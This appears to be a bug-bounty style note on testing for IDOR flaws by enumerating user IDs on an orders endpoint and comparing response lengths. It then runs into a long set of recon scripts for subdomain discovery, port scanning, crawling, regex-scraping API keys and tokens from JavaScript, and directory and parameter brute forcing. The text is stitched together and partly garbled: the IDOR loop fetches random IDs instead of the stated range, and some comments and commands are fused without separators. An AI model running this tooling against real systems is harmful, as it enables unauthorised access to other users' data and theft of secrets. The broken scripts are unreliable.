## Use case

The article discusses how to automate the testing for IDOR vulnerabilities by enumerating IDs and diffing responses, which is crucial for identifying unauthorized access to user data.

## Steps to test

1. Identify an endpoint that accepts an ID parameter, such as /api/orders?user_id=FUZZ.
2. Use a script to automate requests by replacing FUZZ with a range of IDs (e.g., 1 to 500).
3. Capture the response lengths for each request to identify discrepancies.
4. Analyze the response lengths to find any that differ significantly from the 'not found' response.

## Commands

```text
#!/bin/bash
URL_TEMPLATE='https://example.com/api/orders?user_id=FUZZ'
COOKIE='your_cookie_here'
for i in $(seq 1 500); do ID=$((RANDOM % 5000)); RESP=$(curl -s -H "Cookie: $COOKIE" "${URL_TEMPLATE/FUZZ/$ID}"); LEN=${#RESP}; echo "$ID,$LEN" >> idor_results.csv; done
#!/bin/bash
# recon_subs.sh
DOMAIN=$1
mkdir -p recon/$DOMAIN
cd recon/$DOMAIN
subfinder -d $DOMAIN -all -silent > subs_subfinder.txt
assetfinder --subs-only $DOMAIN > subs_assetfinder.txt
amass enum -passive -d $DOMAIN -o subs_amass.txt
cat subs_*.txt | sort -u > all_subs.txt
echo "[+] $(wc -l < all_subs.txt) unique subdomains found"
#!/bin/bash
# recon_probe.sh
cat all_subs.txt | dnsx -silent -a -resp-only > resolved.txt
cat resolved.txt | httpx -silent -title -status-code -tech-detect -ip \
-o live_hosts.txt
#!/bin/bash
# recon_ports.sh
cat live_hosts.txt | cut -d' ' -f1 | sed 's~https\?://~~' > hosts_only.txt
naabu -list hosts_only.txt -top-ports 1000 -silent -o open_ports.txt
#!/bin/bash
# recon_crawl.sh
katana -list live_hosts.txt -jc -d 3 -silent -o crawled_urls.txt
grep '\.js$' crawled_urls.txt > js_files.txt pull secrets and endpoints out of JS
cat js_files.txt | while read url; do
curl -s "$url" | grep -oE "(\"|')(\/api\/[a-zA-Z0-9_\/\-]+)(\"|')"
done | sort -u > js_endpoints.txt
# secretfinder or trufflehog style regex sweep
cat js_files.txt | while read url; do
curl -s "$url"
done > all_js_content.txt grep -oE "(api[_-]?key|secret|token|aws_access_key_id)[\"']?\s*[:=]\s*[\"'][a-zA-Z0-9\-_]{10,}[\"']" \
all_js_content.txt > possible_secrets.txt
#!/bin/bash
# recon_history.sh
cat hosts_only.txt | while read h; do
waybackurls "$h"
gau "$h"
done | sort -u > historical_urls.txt# filter to interesting parameterized URLs
grep '?' historical_urls.txt | grep -viE "\.(png|jpg|jpeg|gif|css|svg|woff)" \
> historical_params.txt
#!/bin/bash
# recon_params.sh
cat live_hosts.txt | cut -d' ' -f1 > urls.txt
# ffuf directory brute force per host
while read url; do
ffuf -u "$url/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-mc 200,301,302,403 -t 50 -silent -o "ffuf_$(echo $url | md5sum | cut -d' ' -f1).json"
done < urls.txt
# arjun for hidden parameters on discovered endpoints
arjun -i historical_params.txt -oT arjun_params.txt
```
